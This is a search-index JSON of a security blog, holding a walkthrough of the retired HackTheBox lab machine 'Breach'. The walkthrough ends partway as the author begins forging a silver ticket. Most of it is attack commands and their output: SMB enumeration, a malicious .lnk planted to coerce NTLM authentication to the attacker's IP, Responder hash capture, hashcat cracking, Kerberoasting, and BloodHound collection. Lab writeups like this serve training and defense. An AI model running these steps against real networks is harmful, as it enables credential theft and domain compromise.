{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"About","text":""},{"location":"#about","title":"About","text":"<p>Here you might find writeups for CTF challenges, retired HTB/Offsec lab machines, etc.  Maybe a blog to talk about security-related topics involving CTFs or challenges.</p>"},{"location":"writeups/HackTheBox/Machines/Breach/","title":"Breach","text":""},{"location":"writeups/HackTheBox/Machines/Breach/#nmap-scan","title":"Nmap Scan","text":"<p>Nmap scan of the target host </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb]\n\u2514\u2500$ nmap -A -Pn 10.129.38.236\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-10-24 22:54 PDT\nNmap scan report for 10.129.38.236\nHost is up (0.10s latency).\nNot shown: 986 filtered tcp ports (no-response)\nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain        Simple DNS Plus\n80/tcp   open  http          Microsoft IIS httpd 10.0\n|_http-title: IIS Windows Server\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-25 05:55:31Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  tcpwrapped\n1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM\n| ms-sql-info: \n|   10.129.38.236:1433: \n|     Version: \n|       name: Microsoft SQL Server 2019 RTM\n|       number: 15.00.2000.00\n|       Product: Microsoft SQL Server 2019\n|       Service pack level: RTM\n|       Post-SP patches applied: false\n|_    TCP port: 1433\n| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback\n| Not valid before: 2025-10-25T05:56:19\n|_Not valid after:  2055-10-25T05:56:19\n| ms-sql-ntlm-info: \n|   10.129.38.236:1433: \n|     Target_Name: BREACH\n|     NetBIOS_Domain_Name: BREACH\n|     NetBIOS_Computer_Name: BREACHDC\n|     DNS_Domain_Name: breach.vl\n|     DNS_Computer_Name: BREACHDC.breach.vl\n|     DNS_Tree_Name: breach.vl\n|_    Product_Version: 10.0.20348\n|_ssl-date: 2025-10-25T09:57:48+00:00; 0s from scanner time.\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)\n3269/tcp open  tcpwrapped\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n| rdp-ntlm-info: \n|   Target_Name: BREACH\n|   NetBIOS_Domain_Name: BREACH\n|   NetBIOS_Computer_Name: BREACHDC\n|   DNS_Domain_Name: breach.vl\n|   DNS_Computer_Name: BREACHDC.breach.vl\n|   Product_Version: 10.0.20348\n|_  System_Time: 2025-10-25T05:55:48+00:00\n|_ssl-date: 2025-10-25T05:56:27+00:00; 0s from scanner time.\n| ssl-cert: Subject: commonName=BREACHDC.breach.vl\n| Not valid before: 2025-09-07T08:04:48\n|_Not valid after:  2026-03-09T08:04:48\n5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)\nOS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016\nAggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: BREACHDC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n| smb2-time: \n|   date: 2025-10-25T05:55:52\n|_  start_date: N/A\n\nTRACEROUTE (using port 53/tcp)\nHOP RTT       ADDRESS\n1   105.63 ms 10.10.14.1\n2   105.65 ms 10.129.38.236\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 106.28 seconds\n</code></pre><p></p> <p>As this appears to be a domain controller, I have configured my environment for operation within a Kerberos realm, using tooling for this purpose https://github.com/SYANiDE-/tooling</p> <ul> <li>entries in /etc/hosts<ul> <li><code>echo \"10.129.38.236 breachdc.breach.vl breach.vl breach breachdc\" | sudo tee -a /etc/hosts</code></li> </ul> </li> <li>/etc/resolv.conf<ul> <li><code>domain breach.vl</code></li> <li><code>nameserver 10.129.38.236</code></li> </ul> </li> <li>/etc/krb5.conf<ul> <li><code>sudo make_krb5.conf.py -d breachdc.breach.vl -w</code></li> </ul> </li> <li>timesync to the domain controller<ul> <li><code>sudo systemctl start vbox-disable-timesync.service</code></li> <li><code>sudo ntpdate -u breachdc</code></li> </ul> </li> </ul>"},{"location":"writeups/HackTheBox/Machines/Breach/#enumeration","title":"Enumeration","text":"<p>The guest account is enabled </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb]\n\u2514\u2500$ nxc smb breachdc.breach.vl -u guest -p \"\"\nSMB         10.129.38.236   445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)\nSMB         10.129.38.236   445    BREACHDC         [+] breach.vl\\guest:\n</code></pre><p></p> <p>The guest account has read/write on the <code>share</code> share, and read permissions on the <code>users</code> share. </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb]\n\u2514\u2500$ nxc smb breachdc.breach.vl -u guest -p \"\" --shares\nSMB         10.129.38.236   445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)\nSMB         10.129.38.236   445    BREACHDC         [+] breach.vl\\guest: \nSMB         10.129.38.236   445    BREACHDC         [*] Enumerated shares\nSMB         10.129.38.236   445    BREACHDC         Share           Permissions     Remark\nSMB         10.129.38.236   445    BREACHDC         -----           -----------     ------\nSMB         10.129.38.236   445    BREACHDC         ADMIN$                          Remote Admin\nSMB         10.129.38.236   445    BREACHDC         C$                              Default share\nSMB         10.129.38.236   445    BREACHDC         IPC$            READ            Remote IPC\nSMB         10.129.38.236   445    BREACHDC         NETLOGON                        Logon server share \nSMB         10.129.38.236   445    BREACHDC         share           READ,WRITE      \nSMB         10.129.38.236   445    BREACHDC         SYSVOL                          Logon server share \nSMB         10.129.38.236   445    BREACHDC         Users           READ\n</code></pre><p></p> <p>In the <code>share</code> share: </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb]\n\u2514\u2500$ impacket-smbclient breach.vl/guest@breachdc.breach.vl -no-pass\n\n[...]\n# ls\ndrw-rw-rw-          0  Sat Oct 25 00:35:33 2025 .\ndrw-rw-rw-          0  Tue Sep  9 03:35:32 2025 ..\ndrw-rw-rw-          0  Thu Feb 17 03:19:36 2022 finance\ndrw-rw-rw-          0  Thu Feb 17 03:19:13 2022 software\ndrw-rw-rw-          0  Mon Sep  8 03:13:44 2025 transfer\n# cd transfer\n# pwd\n/transfer\n# ls\ndrw-rw-rw-          0  Mon Sep  8 03:13:44 2025 .\ndrw-rw-rw-          0  Sat Oct 25 00:35:33 2025 ..\ndrw-rw-rw-          0  Thu Feb 17 03:23:51 2022 claire.pope\ndrw-rw-rw-          0  Thu Feb 17 03:23:22 2022 diana.pope\ndrw-rw-rw-          0  Wed Apr 16 17:38:12 2025 julia.wong\n</code></pre><p></p> <p>None of these directories are accessible by guest.  But they are usernames, which might come in handy.</p> <p>The other folders, <code>finance</code> and <code>software</code> are empty.</p> <p>These users don't have DONT_REQUIRE_PREAUTH set </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ impacket-GetNPUsers -dc-host breachdc.breach.vl -usersfile users.txt breach.vl/guest -no-pass\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[-] User claire.pope doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User diana.pope doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User julia.wong doesn't have UF_DONT_REQUIRE_PREAUTH set\n</code></pre><p></p> <p>I used the slinky module to place an .ico on the <code>share</code> share,  </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ nxc smb breachdc.breach.vl -u guest -p \"\" -M slinky -o SERVER=10.10.14.204 NAME=funtime ICO_URI=\\\\\\\\10.10.14.204\\\\test\\\\icon.ico SHARES=share/software IGNORE=c\\$,admin\\$,netlogon,sysvol,users --smb-timeout 10\n</code></pre><p></p> <p>downloaded it, then re-uploaded it into all three folders using impacket-smbclient: </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ impacket-smbclient breach.vl/guest@breachdc.breach.vl -no-passImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\nType help for list of commands\n# ls\ndrw-rw-rw-          0  Sat Oct 25 01:25:14 2025 .\ndrw-rw-rw-          0  Tue Sep  9 03:35:32 2025 ..\ndrw-rw-rw-          0  Sat Oct 25 01:20:09 2025 finance\ndrw-rw-rw-          0  Sat Oct 25 01:19:56 2025 software\ndrw-rw-rw-          0  Sat Oct 25 01:20:34 2025 transfer\n# use share\n# cd finance\n# put funtime.lnk\n# cd ../software\n# put funtime.lnk\n# cd ../transfer\n# put funtime.lnk\n</code></pre><p></p> <p>Stood up responder in analyze mode, and eventually I captured an NetNTLMv2-SSP authentication </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 2 ~/htb/machines/breach]\n\u2514\u2500$ sudo responder -I tun0 -A\n[sudo] password for notroot: \n                                         __\n  .----.-----.-----.-----.-----.-----.--|  |.-----.----.\n  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|\n  |__| |_____|_____|   __|_____|__|__|_____||_____|__|\n                   |__|\n\n\n[+] Poisoners:\n    LLMNR                      [OFF]\n    NBT-NS                     [OFF]\n    MDNS                       [OFF]\n    DNS                        [ON]\n    DHCP                       [OFF]\n\n[+] Servers:\n    HTTP server                [ON]\n    HTTPS server               [ON]\n    WPAD proxy                 [OFF]\n    Auth proxy                 [OFF]\n    SMB server                 [ON]\n    Kerberos server            [ON]\n    SQL server                 [ON]\n    FTP server                 [ON]\n    IMAP server                [ON]\n    POP3 server                [ON]\n    SMTP server                [ON]\n    DNS server                 [ON]\n    LDAP server                [ON]\n    MQTT server                [ON]\n    RDP server                 [ON]\n    DCE-RPC server             [ON]\n    WinRM server               [ON]\n    SNMP server                [ON]\n\n[+] HTTP Options:\n    Always serving EXE         [OFF]\n    Serving EXE                [OFF]\n    Serving HTML               [OFF]\n    Upstream Proxy             [OFF]\n\n[+] Poisoning Options:\n    Analyze Mode               [ON]\n    Force WPAD auth            [OFF]\n    Force Basic Auth           [OFF]\n    Force LM downgrade         [OFF]\n    Force ESS downgrade        [OFF]\n\n[+] Generic Options:\n    Responder NIC              [tun0]\n    Responder IP               [10.10.14.204]\n    Responder IPv6             [dead:beef:2::10ca]\n    Challenge set              [random]\n    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']\n    Don't Respond To MDNS TLD  ['_DOSVC']\n    TTL for poisoned response  [default]\n\n[+] Current Session Variables:\n    Responder Machine Name     [WIN-DHPV0P7ZJXQ]\n    Responder Domain Name      [SAHT.LOCAL]\n    Responder DCE-RPC Port     [47411]\n\n[*] Version: Responder 3.1.7.0\n[*] Author: Laurent Gaffie, &lt;lgaffie@secorizon.com&gt;\n[*] To sponsor Responder: https://paypal.me/PythonResponder\n\n[+] Listening for events...\n\n[Analyze mode: ICMP] You can ICMP Redirect on this network.\n[Analyze mode: ICMP] This workstation (10.10.14.204) is not on the same subnet than the DNS server (10.129.38.236).\n[Analyze mode: ICMP] Use `python tools/Icmp-Redirect.py` for more details.\n[Analyze mode: ICMP] You can ICMP Redirect on this network.\n[Analyze mode: ICMP] This workstation (10.10.14.204) is not on the same subnet than the DNS server (192.168.50.1).\n[Analyze mode: ICMP] Use `python tools/Icmp-Redirect.py` for more details.\n[+] Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned.\n[SMB] NTLMv2-SSP Client   : 10.129.38.236\n[SMB] NTLMv2-SSP Username : BREACH\\Julia.Wong\n[SMB] NTLMv2-SSP Hash     : Julia.Wong::BREACH:b8e16237cccbf32c:374403FAE1D07A04042DB4FBA1642BD5:0101000000000000801EB0A04C45DC0113874E71A609ED8E0000000002000800530041004800540001001E00570049004E002D0044004800500056003000500037005A004A005800510004003400570049004E002D0044004800500056003000500037005A004A00580051002E0053004100480054002E004C004F00430041004C000300140053004100480054002E004C004F00430041004C000500140053004100480054002E004C004F00430041004C0007000800801EB0A04C45DC0106000400020000000800300030000000000000000100000000200000D0EFE4A5B18E1ACF4FD3A7E00E6BC2F32D639EC43CD9B40C9FA69C3E42C199EC0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200300034000000000000000000\n</code></pre><p></p> <p>I was then able to crack the hash quite easily </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ hashcat --identify julia.wong.netntlmv2-ssp \nThe following hash-mode match the structure of your input hash:\n\n      # | Name                                                       | Category\n  ======+============================================================+======================================\n   5600 | NetNTLMv2                                                  | Network Protocol\n\n\n\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ hashcat -m 5600 julia.wong.netntlmv2-ssp /usr/share/wordlists/rockyou.txt --force --quiet\nJULIA.WONG::BREACH:b8e16237cccbf32c:374403fae1d07a04042db4fba1642bd5:0101000000000000801eb0a04c45dc0113874e71a609ed8e0000000002000800530041004800540001001e00570049004e002d0044004800500056003000500037005a004a005800510004003400570049004e002d0044004800500056003000500037005a004a00580051002e0053004100480054002e004c004f00430041004c000300140053004100480054002e004c004f00430041004c000500140053004100480054002e004c004f00430041004c0007000800801eb0a04c45dc0106000400020000000800300030000000000000000100000000200000d0efe4a5b18e1acf4fd3a7e00e6bc2f32d639ec43cd9b40c9fa69c3e42c199ec0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003200300034000000000000000000:Computer1\n</code></pre><p></p> <p>Credential: </p><pre><code>julia.wong:Computer1\n</code></pre><p></p> <p>Get a ccache </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ impacket-getTGT breach.vl/julia.wong:Computer1\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Saving ticket in julia.wong.ccache\n\n\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ export KRB5CCNAME=$(pwd)/julia.wong.ccache\n\n\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ klist\nTicket cache: FILE:/home/notroot/htb/machines/breach/julia.wong.ccache\nDefault principal: julia.wong@BREACH.VL\n\nValid starting       Expires              Service principal\n10/25/2025 01:29:19  10/25/2025 11:29:19  krbtgt/BREACH.VL@BREACH.VL\n        renew until 10/26/2025 01:29:19\n</code></pre><p></p>"},{"location":"writeups/HackTheBox/Machines/Breach/#what-can-juliawong-do","title":"What can julia.wong do","text":"<p>read/write on the <code>share</code> share, and read on the <code>users</code> share </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ nxc smb breachdc.breach.vl -k --use-kcache --shares\nSMB         breachdc.breach.vl 445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)\nSMB         breachdc.breach.vl 445    BREACHDC         [+] BREACH.VL\\julia.wong from ccache \nSMB         breachdc.breach.vl 445    BREACHDC         [*] Enumerated shares\nSMB         breachdc.breach.vl 445    BREACHDC         Share           Permissions     Remark\nSMB         breachdc.breach.vl 445    BREACHDC         -----           -----------     ------\nSMB         breachdc.breach.vl 445    BREACHDC         ADMIN$                          Remote Admin\nSMB         breachdc.breach.vl 445    BREACHDC         C$                              Default share\nSMB         breachdc.breach.vl 445    BREACHDC         IPC$            READ            Remote IPC\nSMB         breachdc.breach.vl 445    BREACHDC         NETLOGON        READ            Logon server share \nSMB         breachdc.breach.vl 445    BREACHDC         share           READ,WRITE      \nSMB         breachdc.breach.vl 445    BREACHDC         SYSVOL          READ            Logon server share \nSMB         breachdc.breach.vl 445    BREACHDC         Users           READ\n</code></pre><p></p> <p>Nothing particularly interesting in the <code>users</code> share for julia.wong, but the <code>share</code> share, julia.wong directory, found a user.txt.</p> <p>Flag: </p><pre><code># pwd\n/transfer/julia.wong\n# cat user.txt\n55d33e52bc5fa7a687b9f0dcfa103dda\n</code></pre><p></p> <p>Get a list of usernames </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ impacket-GetADUsers -k -no-pass -all breach.vl/julia.wong@breachdc.breach.vl  | awk '{print $1}'\nImpacket\n\n[*]\n[*]\nName\n--------------------\nAdministrator\nGuest\nkrbtgt\nClaire.Pope\nJulia.Wong\nHilary.Reed\nDiana.Pope\nJasmine.Price\nGeorge.Williams\nLawrence.Kaur\nJasmine.Slater\nHugh.Watts\nChristine.Bruce\nsvc_mssql\n</code></pre><p></p> <p>When trying to kerberoast users, I found a type 18 hash for krbtgt (typically uncrackable), and a type 23 for user svc_mssql, really only the latter is interesting/likely. </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ impacket-GetUserSPNs -k -no-pass -usersfile usernames.txt breach.vl/julia.wong@breachdc.breach.vl\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies\n\n[...]\n$krb5tgs$23$*svc_mssql$BREACH.VL$svc_mssql*$a5e7289dba70d9f14d87fe9a9c755c68$5fa599a1f540061fb2ac763183bee9345f919e74475ec9ebd3ed16577467bbac36687f40bde507966e4c69160e124809694d4e439b6cf7b6e13a3fa979d41b89def9d4092e4d500279393a2c4053816ce493380a91cc6d3df537878386c5232d05e55fe5b383595a598a3ba6d851aa8050e24acd3e9262338cbbf217362628cd879d2bf28b71cc8490f4f925985e925e0c11cb034e0f596fdcc880cf776ff89bf074653fc845517fdf20fc000a764d60e8e40f02749fab8d3e933f97b5716c50e25ae5276b63f9f9cdb79310e2b78341e1e28cfd318aebcb161f24ef5375a24aef19fecdbfd6fcec43ef3a68ecd77a9871d5bc60d38b8fefef96bd8a8f3d810f99e072101544c016c59e5ae7e77b6d00374ddb6b8d04e66019cfbe4844d5f6e20ce0da93e5cb90d1166e3443938592c18cef268e1d03ec231386de645d06755c3413364e48cf7f0b2d043e8dfdd77cc1c36683f04ab393d09f80f3801a654d46632492d47a0e3202ee8893be81b99b2321912570ff009583eac925dd6c8cc8cfec9f6722d46fdbdbd9668cc69f381344c0fb2a289e4156e279cd45839f59967db489be7804b68cf4e28338e57265d80c738af907b6da89dd955ba8e4fbf964d302179cfe9b1933fa4c048a7323063c8d533f5109dc44322499332d74fcc1e5e413c836d0d327d32e776907a45aa16b338ab60498c3282ff349f3449db104045167faa0e1dd478fe592aaf0658d9c90083b83463071b26dfc0aed506d0d45e7d6d7eec361112a63390e5e8a302179be563639721362f8ae6a5a7ff7df22c658e855e0708fbc801b97249017540097ae081a63a1f421264dbbe87058043aa70ae5cd07d852a9c83a3ae6fb6be011fb25beed055597518e8ab08245ca90526c4b7ffa9d778c4ffbc91b9b5cdc87f01c92510a1e6a90f353fd695b1b538f6760dd983f1a404d581375b90e0cee7b53770fd448123d2dfcabf056ace05258f2d693d261e4380b81a53c392805e68b235ea14f75dadd658b766cc62829d834123a20624c2cd731083019bc3967bbb03874455cc0a7798af7c4b65329be27df0d3497fc1c3386b9c1cf01f4f9f210610c8fe82c9676be0ea048311245ab7a1b953a2f7b14745ccf3a72c08690bbe58278bed055a37a15cbf7afd650846d941f0bf590f9fafa8bd3b8cc9192731643116b3e1026630fb891833586ee59ac42747b69052aefd46c58275a857c2b0630021d922a223e443ea7eaaffa6374123d1e800fdbf97919a898fc38e9244b2af807bb145e670646d02162f052392bd7e5624ffd01dde9f51f28907df02281f979994bd5cb9a8b19574c346a716b0abac13669813c11dbfdd1bbc8640b62f256f62c1214b9d845992dadee03fa5fb7c28ac6a83b5d0f4675f9a80741e25507132a52710d972d887fcd5d0df9a21490e432be1e8f7a069e3ddef21121c7142f8e54cd29399b00c5adeabc\n</code></pre><p></p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ hashcat --identify svc_mssql.hash \nThe following hash-mode match the structure of your input hash:\n\n      # | Name                                                       | Category\n  ======+============================================================+======================================\n  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol\n\n\n\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ hashcat -m 13100 svc_mssql.hash /usr/share/wordlists/rockyou.txt --force --quiet \n$krb5tgs$23$*svc_mssql$BREACH.VL$svc_mssql*$a5e7289dba70d9f14d87fe9a9c755c68$5fa599a1f540061fb2ac763183bee9345f919e74475ec9ebd3ed16577467bbac36687f40bde507966e4c69160e124809694d4e439b6cf7b6e13a3fa979d41b89def9d4092e4d500279393a2c4053816ce493380a91cc6d3df537878386c5232d05e55fe5b383595a598a3ba6d851aa8050e24acd3e9262338cbbf217362628cd879d2bf28b71cc8490f4f925985e925e0c11cb034e0f596fdcc880cf776ff89bf074653fc845517fdf20fc000a764d60e8e40f02749fab8d3e933f97b5716c50e25ae5276b63f9f9cdb79310e2b78341e1e28cfd318aebcb161f24ef5375a24aef19fecdbfd6fcec43ef3a68ecd77a9871d5bc60d38b8fefef96bd8a8f3d810f99e072101544c016c59e5ae7e77b6d00374ddb6b8d04e66019cfbe4844d5f6e20ce0da93e5cb90d1166e3443938592c18cef268e1d03ec231386de645d06755c3413364e48cf7f0b2d043e8dfdd77cc1c36683f04ab393d09f80f3801a654d46632492d47a0e3202ee8893be81b99b2321912570ff009583eac925dd6c8cc8cfec9f6722d46fdbdbd9668cc69f381344c0fb2a289e4156e279cd45839f59967db489be7804b68cf4e28338e57265d80c738af907b6da89dd955ba8e4fbf964d302179cfe9b1933fa4c048a7323063c8d533f5109dc44322499332d74fcc1e5e413c836d0d327d32e776907a45aa16b338ab60498c3282ff349f3449db104045167faa0e1dd478fe592aaf0658d9c90083b83463071b26dfc0aed506d0d45e7d6d7eec361112a63390e5e8a302179be563639721362f8ae6a5a7ff7df22c658e855e0708fbc801b97249017540097ae081a63a1f421264dbbe87058043aa70ae5cd07d852a9c83a3ae6fb6be011fb25beed055597518e8ab08245ca90526c4b7ffa9d778c4ffbc91b9b5cdc87f01c92510a1e6a90f353fd695b1b538f6760dd983f1a404d581375b90e0cee7b53770fd448123d2dfcabf056ace05258f2d693d261e4380b81a53c392805e68b235ea14f75dadd658b766cc62829d834123a20624c2cd731083019bc3967bbb03874455cc0a7798af7c4b65329be27df0d3497fc1c3386b9c1cf01f4f9f210610c8fe82c9676be0ea048311245ab7a1b953a2f7b14745ccf3a72c08690bbe58278bed055a37a15cbf7afd650846d941f0bf590f9fafa8bd3b8cc9192731643116b3e1026630fb891833586ee59ac42747b69052aefd46c58275a857c2b0630021d922a223e443ea7eaaffa6374123d1e800fdbf97919a898fc38e9244b2af807bb145e670646d02162f052392bd7e5624ffd01dde9f51f28907df02281f979994bd5cb9a8b19574c346a716b0abac13669813c11dbfdd1bbc8640b62f256f62c1214b9d845992dadee03fa5fb7c28ac6a83b5d0f4675f9a80741e25507132a52710d972d887fcd5d0df9a21490e432be1e8f7a069e3ddef21121c7142f8e54cd29399b00c5adeabc:Trustno1\n</code></pre> <p>Credential: </p><pre><code>svc_mssql:Trustno1\n</code></pre><p></p> <p>Get a ccache </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ impacket-getTGT breach.vl/svc_mssql:Trustno1\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Saving ticket in svc_mssql.ccache\n</code></pre><p></p> <p>This is a good start.  Lets examine with Bloodhound.</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ bloodhound-ce-python -k -no-pass -d breach.vl -u julia.wong -dc breachdc.breach.vl -c all --zip -op bloody\nINFO: BloodHound.py for BloodHound Community Edition\nINFO: Found AD domain: breach.vl\nINFO: Using TGT from cache\nINFO: Found TGT with correct principal in ccache file.\nINFO: Connecting to LDAP server: breachdc.breach.vl\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: breachdc.breach.vl\nINFO: Found 15 users\nINFO: Found 54 groups\nINFO: Found 2 gpos\nINFO: Found 2 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: BREACHDC.breach.vl\nINFO: Done in 00M 26S\nINFO: Compressing output into 20251025015627_bloodhound.zip\n</code></pre> <p>Interestingly, Julia.wong is a member of Staff and Print Operators.</p> <p></p> <p>There is nothing particularly interesting about the Staff group, but Print Operators: https://notes.dollarboysushil.com/windows-privilege-escalation/group-privileges/print-operators </p><pre><code>The **Print Operators** group is a highly privileged group in Windows that grants its members several significant permissions, including:\n\n- `**SeLoadDriverPrivilege**`: Allows members to load and manage system drivers.\n\n- The ability to manage, create, share, and delete printers connected to a Domain Controller.\n\n- The ability to log on locally to a Domain Controller and shut it down.\n</code></pre><p></p> <p>There is also the potential to execute shellcode in the context of NT AUTHORITY\\System, using the Capcom.sys driver.</p> <p>Maybe this is something, maybe it is not.  I might circle back to this. </p> <p>One other thing I saw was that there is a domain admin user, christine.bruce, which has password not required set:</p> <p></p> <p>That is pretty interesting, but not sure how that could work out from here.</p>"},{"location":"writeups/HackTheBox/Machines/Breach/#get-shell","title":"Get shell","text":"<p>Both of my controlled users are guests on the mssql instance </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ impacket-mssqlclient breach.vl/julia.wong:Computer1@breachdc.breach.vl -windows-auth\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\n[*] INFO(BREACHDC\\SQLEXPRESS): Line 1: Changed database context to 'master'.\n[*] INFO(BREACHDC\\SQLEXPRESS): Line 1: Changed language setting to us_english.\n[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) \n[!] Press help for extra shell commands\nSQL (BREACH\\Julia.Wong  guest@master)&gt; exit\n\n\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ impacket-mssqlclient breach.vl/svc_mssql:Trustno1@breachdc.breach.vl -windows-auth\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\n[*] INFO(BREACHDC\\SQLEXPRESS): Line 1: Changed database context to 'master'.\n[*] INFO(BREACHDC\\SQLEXPRESS): Line 1: Changed language setting to us_english.\n[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) \n[!] Press help for extra shell commands\nSQL (BREACH\\svc_mssql  guest@master)&gt; exit\n</code></pre><p></p> <p>I do have the credentials for the svc_mssql user, and their spn is <code>MSSQLSvc/breachdc.breach.vl:1433</code>.  I could forge a silver ticket for that SPN for christine.  Lets do that</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ cat ~/bin/password_to_ntlm_hash.py \n#!/usr/bin/env python3\nimport hashlib\nimport binascii\n\ndef convert_to_ntlm(password):\n    encoded_password = password.encode('utf-16le')\n    md4_hash = hashlib.new('md4', encoded_password).digest()\n    ntlm_hash = binascii.hexlify(md4_hash).decode('utf-8')\n    return ntlm_hash\n\npassword = input(\"Give password:&gt; \")\nntlm_hash = convert_to_ntlm(password)\nprint(f\"Password: {password}\")\nprint(f\"NTLM Hash: {ntlm_hash}\")\n</code></pre> <p>Hash svc_mssqls password </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ ~/bin/password_to_ntlm_hash.py\nGive password:&gt; Trustno1\nPassword: Trustno1\nNTLM Hash: 69596c7aa1e8daee17f8e78870e25a5c\n</code></pre><p></p> <p>Forge a service ticket for christine.bruce, for the MSSQLSvc/ SPN. 